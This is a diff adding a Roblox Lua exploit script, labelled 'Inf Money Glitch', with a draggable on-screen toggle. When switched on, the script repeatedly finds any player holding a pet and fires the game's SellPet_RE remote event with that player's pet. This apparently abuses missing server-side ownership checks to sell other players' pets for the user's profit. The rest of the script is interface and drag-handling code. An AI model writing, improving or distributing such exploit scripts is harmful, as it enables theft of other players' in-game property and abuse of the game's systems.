@@ -1,0 +1,319 @@
+-- Pet Seller GUI Script
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Variables
+local isEnabled = false
+local connection
+local isDragging = false
+local dragStart = nil
+local startPos = nil
+local dragInput = nil
+local dragConnection = nil
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PetSellerGUI"
+screenGui.Parent = PlayerGui
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 200, 0, 120)
+mainFrame.Position = UDim2.new(0, 50, 0, 50)
+mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = false -- We'll handle dragging manually for better mobile support
+mainFrame.Parent = screenGui
+
+-- Add corner radius
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 10)
+corner.Parent = mainFrame
+
+-- Add stroke
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(85, 85, 85)
+stroke.Thickness = 2
+stroke.Parent = mainFrame
+
+-- Title Label
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Name = "TitleLabel"
+titleLabel.Size = UDim2.new(1, 0, 0, 30)
+titleLabel.Position = UDim2.new(0, 0, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "Inf Money Glitch"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextScaled = true
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.Parent = mainFrame
+
+-- Status Label
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Name = "StatusLabel"
+statusLabel.Size = UDim2.new(1, -20, 0, 25)
+statusLabel.Position = UDim2.new(0, 10, 0, 35)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "Status: Disabled"
+statusLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
+statusLabel.TextScaled = true
+statusLabel.Font = Enum.Font.Gotham
+statusLabel.Parent = mainFrame
+
+-- Toggle Button
+local toggleButton = Instance.new("TextButton")
+toggleButton.Name = "ToggleButton"
+toggleButton.Size = UDim2.new(0, 120, 0, 35)
+toggleButton.Position = UDim2.new(0.5, -60, 0, 70)
+toggleButton.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
+toggleButton.BorderSizePixel = 0
+toggleButton.Text = "START"
+toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleButton.TextScaled = true
+toggleButton.Font = Enum.Font.GothamBold
+toggleButton.Parent = mainFrame
+
+-- Button corner radius
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = toggleButton
+
+-- Target Info Label
+local targetLabel = Instance.new("TextLabel")
+targetLabel.Name = "TargetLabel"
+targetLabel.Size = UDim2.new(1, -20, 0, 20)
+targetLabel.Position = UDim2.new(0, 10, 0, 110)
+targetLabel.BackgroundTransparency = 1
+targetLabel.Text = "Target: None"
+targetLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+targetLabel.TextScaled = true
+targetLabel.Font = Enum.Font.Gotham
+targetLabel.Parent = mainFrame
+
+-- Resize main frame to accommodate target label
+mainFrame.Size = UDim2.new(0, 200, 0, 140)
+
+-- Function to find player with equipped pet
+local function findTargetPlayer()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Character then
+            for _, tool in pairs(player.Character:GetChildren()) do
+                if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
+                    return player, tool.Name
+                end
+            end
+        end
+    end
+    return nil, nil
+end
+
+-- Function to execute pet selling
+local function executePetSell()
+    local targetPlayer, petName = findTargetPlayer()
+    
+    if targetPlayer and petName then
+        targetLabel.Text = "Target: " .. targetPlayer.Name
+        
+        local petObject = targetPlayer.Character:FindFirstChild(petName)
+        if petObject then
+            local args = {
+                [1] = petObject
+            }
+            
+            local success, error = pcall(function()
+                ReplicatedStorage.GameEvents.SellPet_RE:FireServer(unpack(args))
+            end)
+            
+            if not success then
+                print("Error selling pet:", error)
+            end
+        end
+    else
+        targetLabel.Text = "Target: None Found"
+    end
+end
+
+-- Toggle function
+local function toggleScript()
+    isEnabled = not isEnabled
+    
+    if isEnabled then
+        -- Start the script
+        toggleButton.Text = "STOP"
+        toggleButton.BackgroundColor3 = Color3.fromRGB(85, 255, 85)
+        statusLabel.Text = "Status: Enabled"
+        statusLabel.TextColor3 = Color3.fromRGB(85, 255, 85)
+        
+        -- Start the loop
+        connection = RunService.Heartbeat:Connect(function()
+            executePetSell()
+            wait(0.1) -- Small delay to prevent overwhelming
+        end)
+        
+        -- Button animation
+        local tween = TweenService:Create(toggleButton, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            Size = UDim2.new(0, 125, 0, 37)
+        })
+        tween:Play()
+        tween.Completed:Connect(function()
+            TweenService:Create(toggleButton, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+                Size = UDim2.new(0, 120, 0, 35)
+            }):Play()
+        end)
+    else
+        -- Stop the script
+        toggleButton.Text = "START"
+        toggleButton.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
+        statusLabel.Text = "Status: Disabled"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
+        targetLabel.Text = "Target: None"
+        
+        if connection then
+            connection:Disconnect()
+            connection = nil
+        end
+        
+        -- Button animation
+        local tween = TweenService:Create(toggleButton, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            Size = UDim2.new(0, 115, 0, 33)
+        })
+        tween:Play()
+        tween.Completed:Connect(function()
+            TweenService:Create(toggleButton, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+                Size = UDim2.new(0, 120, 0, 35)
+            }):Play()
+        end)
+    end
+end
+
+-- Button click handler
+toggleButton.MouseButton1Click:Connect(toggleScript)
+
+-- Universal dragging system (PC + Mobile)
+local function updateDrag(input)
+    local delta = input.Position - dragStart
+    local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    
+    -- Keep GUI within screen bounds
+    local screenSize = workspace.CurrentCamera.ViewportSize
+    local frameSize = mainFrame.AbsoluteSize
+    
+    local minX = 0
+    local maxX = screenSize.X - frameSize.X
+    local minY = 0
+    local maxY = screenSize.Y - frameSize.Y
+    
+    local newX = math.clamp(startPos.X.Offset + delta.X, minX, maxX)
+    local newY = math.clamp(startPos.Y.Offset + delta.Y, minY, maxY)
+    
+    mainFrame.Position = UDim2.new(0, newX, 0, newY)
+end
+
+-- Start dragging function
+local function startDrag(input)
+    isDragging = true
+    dragStart = input.Position
+    startPos = mainFrame.Position
+    
+    -- Connect to input changed for this specific input
+    dragConnection = input.Changed:Connect(function()
+        if input.UserInputState == Enum.UserInputState.End then
+            isDragging = false
+            if dragConnection then
+                dragConnection:Disconnect()
+                dragConnection = nil
+            end
+        end
+    end)
+end
+
+-- Title bar input handling for dragging
+titleLabel.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        startDrag(input)
+    end
+end)
+
+-- Main frame input handling for dragging (backup)
+mainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        -- Only start drag if not clicking on a button
+        local mousePos = UserInputService:GetMouseLocation()
+        local objectsAtPosition = PlayerGui:GetGuiObjectsAtPosition(mousePos.X, mousePos.Y)
+        
+        local clickedButton = false
+        for _, obj in pairs(objectsAtPosition) do
+            if obj == toggleButton then
+                clickedButton = true
+                break
+            end
+        end
+        
+        if not clickedButton then
+            startDrag(input)
+        end
+    end
+end)
+
+-- Handle drag movement
+UserInputService.InputChanged:Connect(function(input)
+    if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        updateDrag(input)
+    end
+end)
+
+-- Alternative method using GuiService for mobile compatibility
+local function setupDragDetection()
+    local function onInputBegan(input, processed)
+        if processed then return end
+        
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            local mouseLocation = UserInputService:GetMouseLocation()
+            local objectsAtPosition = PlayerGui:GetGuiObjectsAtPosition(mouseLocation.X, mouseLocation.Y)
+            
+            -- Check if we clicked on the title area
+            for _, obj in pairs(objectsAtPosition) do
+                if obj == titleLabel or (obj == mainFrame and mouseLocation.Y <= mainFrame.AbsolutePosition.Y + 35) then
+                    -- Make sure we're not clicking the toggle button
+                    local isToggleButton = false
+                    for _, btnObj in pairs(objectsAtPosition) do
+                        if btnObj == toggleButton then
+                            isToggleButton = true
+                            break
+                        end
+                    end
+                    
+                    if not isToggleButton then
+                        startDrag(input)
+                        break
+                    end
+                end
+            end
+        end
+    end
+    
+    UserInputService.InputBegan:Connect(onInputBegan)
+end
+
+-- Initialize drag detection
+setupDragDetection()
+
+-- Clean up when player leaves
+Players.PlayerRemoving:Connect(function(player)
+    if player == LocalPlayer then
+        if connection then
+            connection:Disconnect()
+        end
+        if dragConnection then
+            dragConnection:Disconnect()
+        end
+    end
+end)
